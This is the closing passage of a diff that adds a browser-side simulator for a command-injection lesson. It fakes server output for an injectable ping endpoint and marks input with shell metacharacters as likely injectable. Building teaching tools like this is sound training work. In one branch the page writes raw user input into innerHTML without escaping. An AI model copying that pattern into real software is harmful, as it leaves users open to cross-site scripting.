+    vOut.innerHTML = '<span style="color:#fbbf24">HTTP 200 OK\n\n[Shell executed with injected payload]\n[Output depends on specific payload]\n\nShell command run:\nping -c1 ' + inp.replace(/</g,'&lt;') + '\n\n→ Injection likely successful</span>';
+    verd.className = 'result-box r-red';
+    verd.innerHTML = '<strong>Likely injectable!</strong> Input contains shell metacharacters. The vulnerable server passes this directly to the shell. Try one of the preset payloads to see concrete output.';
+  } else {
+    vOut.innerHTML = 'HTTP 200 OK\n\n[Running: ping -c1 ' + inp + ']\n...';
+    verd.className = 'result-box r-amber';
+    verd.innerHTML = 'Unknown result for this input. Try the presets to see confirmed injection scenarios.';
+  }
+}
+
+runCmdi();
+</script>
+</body>
+</html>
